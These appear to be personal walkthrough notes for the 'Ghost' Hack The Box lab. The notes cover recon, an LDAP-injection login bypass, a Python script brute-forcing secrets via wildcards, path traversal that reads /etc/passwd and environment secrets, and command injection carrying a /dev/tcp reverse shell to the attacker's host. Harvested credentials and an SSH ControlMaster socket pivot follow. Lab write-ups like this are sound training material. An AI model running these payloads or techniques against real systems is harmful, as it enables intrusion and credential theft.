## HOST RECON

```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8008/tcp  open  http
8443/tcp  open  https-alt
9389/tcp  open  adws
49443/tcp open  unknown
49664/tcp open  unknown
49672/tcp open  unknown
49678/tcp open  unknown
51534/tcp open  unknown
51607/tcp open  unknown
51728/tcp open  unknown
```

## WEB RECON

### https://ghost.htb:8008/ (Ghost CMS)

<meta name="generator" content="Ghost 5.78">

- blog search bar
http://ghost.htb/ghost/api/content/posts/?key=37395e9e872be56438c83aaca6&limit=10000&fields=id%2Cslug%2Ctitle%2Cexcerpt%2Curl%2Cupdated_at%2Cvisibility&order=updated_at%20DESC


#### http://ghost.htb:8008/ghost/api/

"errors":[{"message":"Resource not found","context":null,"type":"NotFoundError","details":null,"property":null,"help":null,"code":null,"id":"c78d26d0-cd7c-11ef-b8b3-e5f236e034e9","ghostErrorCode":null}]}   

404      GET        1l        3w      204c http://ghost.htb:8008/ghost/api/p
404      GET        1l        3w      204c http://ghost.htb:8008/ghost/api/ghost
404      GET        1l        3w      204c http://ghost.htb:8008/ghost/api/email
404      GET        1l        3w      204c http://ghost.htb:8008/ghost/api/webmentions/receive
404      GET        1l        3w      204c http://ghost.htb:8008/ghost/api/r



### MS web form login page

- https://ghost.htb:8443/login  ====>  https://federation.ghost.htb/adfs/ls/?SAMLRequest=nVPBjpswEP0V5HvAkJglVsgqJYdG2rYooT3sZeWYyQYJbOoZdtO%2FryBhN4c2h1z9Zt68efO8eDw1tfcGDitrUhb6nD0uF6iaupWrjo5mC787QPJOTW1QDkDKOmekVVihNKoBlKTlbvXtSUY%2Bl62zZLWtmbdZp%2BxFiLgMY55wPRMhxEpM%2BX7%2BoKMkOcy0jnU8j2MlEsW8X6OIyOfM2yB2sDFIylDKIh6JCQ8nfFpEoRRChsJ%2F4PNn5uWXcV8qU1bm9ba2%2FbkI5deiyCf5j13BvDUgVUbRMPpI1KIMggOU4IY3%2F%2FVokfwj7QNVHjCoMWDeChFcj2bWYNeA24F7qzT83D59cmjr4LNbJrPZ9EzRmxi0FmkL2FqDwM6Oy2Fnd2X17W3UqIItb8xcBFfc42m%2FqwY269zWlf5zz2lXdW3fMweKIGXkOmDBSH0JDJRDfDJrCE53xSezTatchf1d4KQ0jTZdE2e1QtzC4R7TbpZpqXtqQJkrxHfryj5poAnKwimDrXV0sfZfepZn7D92fKDXX2z5Fw%3D%3D&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=kC59W3twEJRSeFV3sURtIA%2F0s1TODs9I%2FP%2BqY6y8o1vHJcd6eBL1oVR4rRFX79VVWLnoGNgJ2IO%2FcX06Qv%2Frc60SpLOmP2O9MlCMlz8AQ81D2%2B%2BdC7VWvJ050%2BXOE26zdzgojwQTSgLw0b6AYQdBadVuAJrUba6neCyAx5fLjTWpewqNm0JQqMuAQd%2FU%2FXc5%2BI5Kle%2BxGZyKEOCTvGdtsAcWDcIvLdQGx9mp4KMLJAV5cVBh%2FK%2B26P20PBZdyuOZFhauyVv9V3FxuB1OqqnzV%2B3UgP2mjgR2wCAJU571kMC0tPWmbaXAmmILcXO7o%2F%2FXttRcf8F1fIKWsSo3bbRyZQ%3D%3D

302      GET        1l        4w       28c https://ghost.htb:8443/ => https://ghost.htb:8443/login
200      GET       33l       76w     1064c https://ghost.htb:8443/login
301      GET       10l       16w      179c https://ghost.htb:8443/public => https://ghost.htb:8443/public/
301      GET       10l       16w      187c https://ghost.htb:8443/public/css => https://ghost.htb:8443/public/css/


- https://ghost.htb:8443/api/login

- POST login req

https://federation.ghost.htb/adfs/ls/?SAMLRequest=nVPBjpswEP0V5HuAGJIFK2SVkkMjbVuU0B56qbz2sEECm3qG3fTvK0jYzaHNIVe%2FmTdv3jyvHk9t472Cw9qajM39kD2uVyjbphObno5mD797QPJObWNQjEDGemeElVijMLIFFKTEYfPlSXA%2FFJ2zZJVtmLfbZuyX5AmkUVylfB4tU%2FUQpTriSoewjMPFQkNVRQ9S8Yp5PyYR3A%2BZt0PsYWeQpKGM8ZAvZuF8Fi5KzkWUiHjpJ0n6k3nFZdyn2ujavNzW9nwuQvG5LItZ8e1QMm8LSLWRNI4%2BEnUogqACDW5881%2BOFsk%2F0nMgdYVBgwHzNojgBjS3BvsW3AHca63g%2B%2F7pg0NZBx%2FdIonj6EwxmBh0FmkP2FmDwM6Oi3Fnd2X17W3kpIKtb8xcBVfc02m%2FyhZ228I2tfpzz2k3TWPfcgeSIGPkemDBRH0JDOgxPrk1BKe74pPbtpOuxuEucJKKJpuuifNGIu6huse0m2VKqIEaUBQS8c06PSQNFIEunTTYWUcXa%2F%2BlZ33G%2FmPHO3r9xdZ%2FAQ%3D%3D&SigAlg=http%3A%2F%2Fwww.w3.org%2F2001%2F04%2Fxmldsig-more%23rsa-sha256&Signature=FOaumhFb4CD0p3mT7mkGLLIsVJd%2FnNy2arQt9XkYOEQMFqpuAJWhdhJoyB1akJndMKFjcwGDCRJ4pwWMJ59MLE9YRaAf8AT1cIdMAqqgEZEgCvUfENJBiWzNOHax75B3yljH439f%2FZ9rOGE0%2BejSmCS8k30HvtFVIWYaROfnRQGUMu%2BHv3xfxjK3gnNGZ1BHATyzmbAKLbKGO1hEWWSGs1tIO6y6zcoNFzEB0zM6vibzztQAMEq3VtC7L1yKFuw2TKfp3U1JTYZoZ1P22u6gFZuJTOv3bjbm7JXmYrJSoOcljIlVBRNd0rPZU0S0rYNUq5eXKNrk2iQSjKg94WIBHA%3D%3D&client-request-id=1f6edaa0-534c-41d1-ad1a-0040000000db


## intranet login page (nextjs and possible ldapjs)

http://intranet.ghost.htb:8008/login

- post login req

```
POST /login HTTP/1.1
Host: intranet.ghost.htb:8008

...

k2982904007
------WebKitFormBoundaryZQMGlICh5pEAx4pu
Content-Disposition: form-data; name="1_ldap-username"

Kathryn
------WebKitFormBoundaryZQMGlICh5pEAx4pu
Content-Disposition: form-data; name="1_ldap-secret"

teste
------WebKitFormBoundaryZQMGlICh5pEAx4pu
Content-Disposition: form-data; name="0"

[{"error":"Invalid combination of username and secret"},"$K1"]
------WebKitFormBoundaryZQMGlICh5pEAx4pu--
```

- https://escaping.mojoauth.com/ldap-escaping-in-nodejs/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection

#### bypass auth with 1_ldap-username = * and 1_ldap-secret = * normally scaped caracter, return jwt token (is possible login with any user with username + password = *)

```
HTTP/1.1 303 See Other
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Jan 2025 05:48:32 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2
Connection: keep-alive
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Set-Cookie: token=Bearer%20eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3Mzg3MzQ1MTIsImlhdCI6MTczNjE0MjUxMiwidXNlciI6eyJ1c2VybmFtZSI6ImthdGhyeW4uaG9sbGFuZCJ9fQ.PK-8FTvRZ4_qeWzhJWw75zjat7gcL6P-3HLuL7bgsc8; Path=/
x-action-revalidated: [[],0,1]
x-action-redirect: /
X-Powered-By: Next.js
ETag: "bwc9mymkdm2"

{}
```

#### logged http://intranet.ghost.htb:8008/

- http://intranet.ghost.htb:8008/news
```
Git Migration
We are currently migrating Gitea to Bitbucket.
Domain logins to Gitea have been disabled.
You can only login with the gitea_temp_principal account and its corresponding intranet token as password.
We can't post the password here for security reasons, but:
For IT: Ask sysadmins for the password.
For sysadmins: Look in LDAP for the attribute. You can also test the credentials by logging in to intranet.

New Intranet Portal
We are in the process of migrating to the new intranet portal (this one).
Until then, you have to use a secret token instead of your domain password.
We apologize for the inconvenience!
```

#### http://intranet.ghost.htb:8008/users

```
kathryn.holland		 Kathryn Holland		sysadmin
cassandra.shelton	 Cassandra Shelton		sysadmin
robert.steeves		 Robert Steeves			sysadmin
florence.ramirez	 Florence Ramirez		IT
justin.bradley		 Justin Bradley			IT, Remote Management Users
arthur.boyd			 Arthur Boyd			IT
beth.clark			 Beth Clark				HR
charles.gray		 Charles Gray			HR
jason.taylor		 Jason Taylor			HR
intranet_principal	 Intranet Principal		principal
gitea_temp_principal Gitea_Temp Principal 	principal
```

#### http://intranet.ghost.htb:8008/forum

```
Cannot connect to BitBucket
Hello all, I tried to connect to bitbucket.ghost.htb but it doesn't work. Any idea why? I have a script that checks the pipeline results and it works in Gitea, I tried adapting it to Bitbucket and it works locally but I can't test it on our servers
Author: justin.bradley
Replies:

    kathryn.holland
    : 
    Hello Justin, the migration is not ready yet, so the DNS entry is not configured. It shouldn't take much longer, so you can keep running the script
```

- gitea.ghost.htb bitbucket.ghost.htb


#### script to brute users pass fro intranet page

```py
import string
import requests

url = 'http://intranet.ghost.htb:8008/login'

headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Connection': 'keep-alive'
} 

password = ""
while True:
        for char in string.ascii_lowercase + string.digits:
                files= {
                        '1_ldap-username': (None, 'username'),
                        '1_ldap-secret': (None, f'{password}{char}*'),
                        '0': (None, '[{},"$K1"]')
                        }
                r = requests.post(url, headers=headers, files=files)
                if r.status_code == 303:
                        password += char
                        print(f"Cur Pwd: {password}")
                        break
        else:
                break
print(password)
```

```
kathryn.holland	- fgevlfymxrksvu9b
robert.steeves - deerdxk8p2xnukxl
florence.ramirez - tc6nhytlemglqoat
justin.bradley - rbhuycyjxfjp4c69
arthur.boyd	- lhhx3kylwqdjxjqp
beth.clark - qdcskgpdhyb4jfv6
charles.gray - lwfpjgzlcyx64kdl
jason.taylor - qudsvb6kvcxuumaq
intranet_principal - rvxyrc2okalucrep
gitea_temp_principal - szrr8kpc3z6onlqf
```

## http://gitea.ghost.htb:8008/

- http://gitea.ghost.htb:8008/explore/users

gitea_temp_principal

cassandra.shelton

#### logged with gitea_temp_principal

##### repo ghost-dev/blog

README.md
```
Our blog uses the Ghost CMS in a Docker container.

We are planning on adding additional features to the blog. One of them is a new connection to the intranet. For example, some posts will be featured on our intranet, or URLs from posts will be scanned by the intranet. However, this is still in development, so some features are behind an API key, shared between the intranet and the blog. It is named DEV_INTRANET_KEY and it is stored as an environment variable.

We modified a bit of the Ghost CMS source code to accomodate such new features. One example is the posts-public.js file, which allows us to extract additional information about the posts. In the future we should move the information to the database so that we don't accidentally lose data on container recreation. Make sure to replace the file when running, or just use the provided Dockerfile.

Also, the public API in Ghost needs an API key. We can write it here since it only allows access to public data: a5af628828958c976a3b6cc81a
```

Dockerfile
```sh
FROM ghost:5-alpine

RUN ln -s /dev/null /root/.bash_history
RUN ln -s /dev/null /home/node/.bash_history

RUN mkdir /var/lib/ghost/extra
RUN echo 659cdeec9cd6330001baefbf > /var/lib/ghost/extra/important

COPY posts-public.js /var/lib/ghost/current/core/server/api/endpoints/posts-public.js

CMD ["node", "current/index.js"]
```

docker-compose.yml
```
version: '3.1'

services:
  ghost:
    build: .
    container_name: ghost
    restart: always
    ports:
      - 4000:2368
    environment:
      database__client: sqlite3
      database__connection__filename: "content/data/ghost.db"
      database__useNullAsDefault: true
      database__debug: false
      url: http://ghost.htb
      NODE_ENV: production
      DEV_INTRANET_KEY: "redacted"
    volumes:
      - ghost:/var/lib/ghost/content

volumes:
  ghost:
  db:
```

post-public.js
```js
const models = require('../../models');
const tpl = require('@tryghost/tpl');
const errors = require('@tryghost/errors');
const {mapQuery} = require('@tryghost/mongo-utils');
const postsPublicService = require('../../services/posts-public');
const getPostServiceInstance = require('../../services/posts/posts-service');
const postsService = getPostServiceInstance();

const allowedIncludes = ['tags', 'authors', 'tiers', 'sentiment'];

const messages = {
    postNotFound: 'Post not found.'
};

const rejectPrivateFieldsTransformer = input => mapQuery(input, function (value, key) {
    const lowerCaseKey = key.toLowerCase();
    if (lowerCaseKey.startsWith('authors.password') || lowerCaseKey.startsWith('authors.email')) {
        return;
    }

    return {
        [key]: value
    };
});

function generateOptionsData(frame, options) {
    return options.reduce((memo, option) => {
        let value = frame.options?.[option];

        if (['include', 'fields', 'formats'].includes(option) && typeof value === 'string') {
            value = value.split(',').sort();
        }

        if (option === 'page') {
            value = value || 1;
        }

        return {
            ...memo,
            [option]: value
        };
    }, {});
}

function generateAuthData(frame) {
    if (frame.options?.context?.member) {
        return {
            free: frame.options?.context?.member.status === 'free',
            tiers: frame.options?.context?.member.products?.map((product) => {
                return product.slug;
            }).sort()
        };
    }
}
module.exports = {
    docName: 'posts',

    browse: {
        headers: {
            cacheInvalidate: false
        },
        cache: postsPublicService.api?.cache,
        generateCacheKeyData(frame) {
            return {
                options: generateOptionsData(frame, [
                    'include',
                    'filter',
                    'fields',
                    'formats',
                    'limit',
                    'order',
                    'page',
                    'absolute_urls',
                    'collection'
                ]),
                auth: generateAuthData(frame),
                method: 'browse'
            };
        },
        options: [
            'include',
            'filter',
            'fields',
            'formats',
            'limit',
            'order',
            'page',
            'debug',
            'absolute_urls',
            'collection'
        ],
        validation: {
            options: {
                include: {
                    values: allowedIncludes
                },
                formats: {
                    values: models.Post.allowedFormats
                }
            }
        },
        permissions: true,
        async query(frame) {
            const options = {
                ...frame.options,
                mongoTransformer: rejectPrivateFieldsTransformer
            };
            const posts = await postsService.browsePosts(options);
            const extra = frame.original.query?.extra;
            if (extra) {
                const fs = require("fs");
                if (fs.existsSync(extra)) {
                    const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
                    posts.meta.extra = { [extra]: fileContent };
                }
            }
            return posts;
        }
    },

    read: {
        headers: {
            cacheInvalidate: false
        },
        cache: postsPublicService.api?.cache,
        generateCacheKeyData(frame) {
            return {
                options: generateOptionsData(frame, [
                    'include',
                    'fields',
                    'formats',
                    'absolute_urls'
                ]),
                auth: generateAuthData(frame),
                method: 'read',
                identifier: {
                    id: frame.data.id,
                    slug: frame.data.slug,
                    uuid: frame.data.uuid
                }
            };
        },
        options: [
            'include',
            'fields',
            'formats',
            'debug',
            'absolute_urls'
        ],
        data: [
            'id',
            'slug',
            'uuid'
        ],
        validation: {
            options: {
                include: {
                    values: allowedIncludes
                },
                formats: {
                    values: models.Post.allowedFormats
                }
            }
        },
        permissions: true,
        query(frame) {
            const options = {
                ...frame.options,
                mongoTransformer: rejectPrivateFieldsTransformer
            };
            return models.Post.findOne(frame.data, options)
                .then((model) => {
                    if (!model) {
                        throw new errors.NotFoundError({
                            message: tpl(messages.postNotFound)
                        });
                    }

                    return model;
                });
        }
    }
};
```


##### repo ghost-dev/intranet


```
We are adding new features to integrate the blog and the intranet. See the blog repo for more details.

Until development is done, we will expose the dev API at `http://intranet.ghost.htb/api-dev`.
```

```
└─$ tree intranet/backend                                                                
intranet/backend
├── Cargo.lock
├── Cargo.toml
├── Dockerfile
├── diesel.toml
├── migrations
│   ├── 2024-01-05-214725_news
│   │   ├── down.sql
│   │   └── up.sql
│   └── 2024-01-05-225610_forum
│       ├── down.sql
│       └── up.sql
└── src
    ├── api
    │   ├── dev
    │   │   └── scan.rs
    │   ├── dev.rs
    │   ├── forum.rs
    │   ├── ldap.rs
    │   ├── login.rs
    │   ├── me.rs
    │   ├── news.rs
    │   └── users.rs
    ├── api.rs
    ├── database
    │   ├── models.rs
    │   └── schema.rs
    ├── database.rs
    └── main.rs
```

```
#[get("/forum")]

#[post("/login", data = "<body>")]

#[get("/me")]

#[get("/news")]

#[get("/ldap_users")]
```


## LFI in http://ghost.htb:8008/ghost/api/

https://ghost.org/docs/content-api/


- http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a                                          

```js
async query(frame) {
            const options = {
                ...frame.options,
                mongoTransformer: rejectPrivateFieldsTransformer
            };
            const posts = await postsService.browsePosts(options);
            const extra = frame.original.query?.extra;
            if (extra) {
                const fs = require("fs");
                if (fs.existsSync(extra)) {
                    const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
                    posts.meta.extra = { [extra]: fileContent };
                }
            }
            return posts;
        }
```


- http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../../etc/passwd&key=a5af628828958c976a3b6cc81a

```
"root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"
```

- http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../../proc/self/environ&key=a5af628828958c976a3b6cc81a

```
"HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"


DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
```

## RCE in http://intranet.ghost.htb/api-dev/scan


```
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();
```

curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"http://10.10.14.58:8000/}'

curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"http://10.10.14.58:8000/; sh -i >& /dev/tcp/10.10.14.58/1234 0>&1"}'


## shell in app linux server

```
└─$ nc -lnvp 1234     
listening on [any] 1234 ...
connect to [10.10.14.58] from (UNKNOWN) [10.10.11.24] 49786
sh: 0: can't access tty; job control turned off
# ls
database.sqlite
ghost_intranet
# whoami
root
```

```
root@36b733906694:/app# env
env
DATABASE_URL=./database.sqlite
HOSTNAME=36b733906694
PWD=/app
HOME=/root
CARGO_HOME=/usr/local/cargo
LDAP_BIND_DN=CN=Intranet Principal,CN=Users,DC=ghost,DC=htb
LDAP_HOST=ldap://windows-host:389
LDAP_BIND_PASSWORD=He!KA9oKVT3rL99j
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
RUSTUP_HOME=/usr/local/rustup
ROCKET_ADDRESS=0.0.0.0
SHLVL=2
RUST_VERSION=1.79.0
LC_CTYPE=C.UTF-8
PATH=/usr/local/cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
JWT_SECRET=*xopkAGbLyg9bK_A
_=/usr/bin/env
OLDPWD=/
```

```
root@36b733906694:~/.ssh# cat known_hosts
cat known_hosts
|1|ILtu1x3DP2QIfSOoI52RPc3ViyQ=|nJus4lng6wikeo4w6tmhJ/QCfTA= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOyB/ecv1AOWnnzYFydee/oJobwgNdUyAfHp/tPvlWP3
|1|fO18fu5GkO0kVV8aPoYw4N6fEZQ=|btXb7GHe/IZHrYYomazw4vVsk0M= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTr5pwjfGGI3ldoaw4cj7FmDmrJ7+lv3O3nPaKM9bx1seFAKWjOxxNw0DkAX0gQwLg1HRtTaSCKxtFH9pGby3fSxuKBBbmbL5eH7Kpw9yryn/oNmori+bQmaCRqcyRROfQ7nQF+YmPd6DYflAjh2jlXJXwVCjjuU7THl2/EENlvyEwCrGLlYu7Udaz0Gyk0cDR5DMsUIhnq4Qkdto28mm7p3XrBOK8BrUfLlU7sWsuwN4WnKGSo+bf7BtAAK88UmNekDMYaXzk1QiXTYeywYRwv32PrWbWbMsrB6KKLnLaRJpqplJa4u8slVXy1N6YVQ9xmotqLxuJiR3GKD8Q3J3W+bWYpRT0gsFoQBFJoOLd0D1b6UZKhzSkMOX9lVXv62CCW0RmjLRt5SarTBNeCw/V8G7hlUwQxyRlcmwim6LxfQiIJfBvbOLe1oNKtVPbniLqXIDw1xj03u+HEUp4M+lA1Ufl9O1DvTZd8yztYFgYk4+HMMFa9JREMrKbKc3uMXc=
|1|95jf5uNJoYdbZykBBN+2Iz4bF0I=|ulvpJwJkz1GPL/74CWyqZ7C8XWI= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKDDfKeJgKvD2hUmxKD/GMsgEAX9mKVwcHRBf4wdyek1OAcfc/NoNxXVoj9kS/u1OIgiq6OqNvI8RvPOp97VLeY=
```

#### ssh controlmaster

- https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing

```
root@36b733906694:~/.ssh# cat config
cat config
Host *
  ControlMaster auto
  ControlPath ~/.ssh/controlmaster/%r@%h:%p
  ControlPersist yes



root@36b733906694:~/.ssh/controlmaster# ls -lah
ls -lah
total 12K
drwxr-xr-x 1 root root 4.0K Feb 21 10:04 .
drwxr-xr-x 1 root root 4.0K Jul  5  2024 ..
srw------- 1 root root    0 Feb 21 10:04 florence.ramirez@ghost.htb@dev-workstation:22



root@36b733906694:~/.ssh/controlmaster# file florence.ramirez@ghost.htb@dev-workstation:22
< file florence.ramirez@ghost.htb@dev-workstation:22
florence.ramirez@ghost.htb@dev-workstation:22: socket

```

- Specifies the socket file to control the SSH connection. This is the control file that was created during the first SSH connection when ControlMaster was enabled. SSH will reuse this existing connection.

ssh -S florence.ramirez@ghost.htb@dev-workstation:22 ghost.htb

## ssh as florence.ramirez

```
Last login: Fri Feb 21 23:05:32 2025 from 172.18.0.3
florence.ramirez@LINUX-DEV-WS01:~$ whoami
whoami
florence.ramirez
florence.ramirez@LINUX-DEV-WS01:~$ hostname
hostname
LINUX-DEV-WS01
florence.ramirez@LINUX-DEV-WS01:~$ id
id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
```



